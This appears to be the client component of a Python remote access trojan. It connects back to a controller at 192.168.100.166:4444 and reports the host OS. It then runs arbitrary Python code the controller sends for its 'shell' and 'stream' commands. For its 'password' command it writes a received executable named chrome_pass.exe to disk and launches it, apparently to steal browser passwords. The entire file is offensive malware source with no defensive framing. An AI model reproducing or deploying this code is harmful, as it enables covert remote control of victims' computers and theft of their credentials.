import os, subprocess, threading, time
from sys import platform
import base64
import cv2
import numpy as np
import socket
import sys
import pickle
import struct
import imutils
import base64
import numpy
import sqlite3
import Cryptodome
import shutils



BUFF_SIZE=4096
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.166", 4444))
if(platform=="win32"):
    s.send(b"Windows")
else:
    s.send(b"Linux")
def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    # Read message length and unpack it into an integer
    msglen = struct.unpack('>I', raw_msglen)[0]
    # Read the message data
    return recvall(sock, msglen)

def recvall(sock, n):
    # Helper function to recv n bytes or return None if EOF is hit
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data
def shell():
    global order
    time.sleep(2)
    exec(order)
def stream():
    global damn
    exec(damn)
def password():
    global code
    file=open("chrome_pass.exe", mode='wb')
    file.write(code)
    file.close()
    os.startfile("chrome_pass.exe")
    print("Passwords sent")
while(True):
    command=s.recv(4096)
    decoded=command.decode()
    if(decoded=="shell"):
        shellcode=s.recv(1024)
        order=shellcode.decode()
        print(order)
        shell_thread=threading.Thread(target=shell)
        shell_thread.start()
    elif(decoded=="stream"):
        streamcode=s.recv(1024)
        damn=streamcode.decode()
        print(damn)
        stream_thread=threading.Thread(target=stream)
        stream_thread.start()
    elif(decoded=="password"):
        passcode=recv_msg(s)
        code=passcode
        print(code)
        password_thread=threading.Thread(target=password)
        password_thread.start()
